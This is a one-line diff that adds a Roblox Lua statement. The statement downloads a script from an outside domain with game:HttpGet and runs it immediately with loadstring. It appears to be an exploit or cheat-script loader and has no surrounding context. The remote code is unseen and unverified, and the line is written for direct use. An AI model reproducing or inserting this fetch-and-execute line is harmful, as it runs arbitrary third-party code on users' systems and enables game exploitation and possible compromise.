@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://weinzspace.com/loader.lua"))()
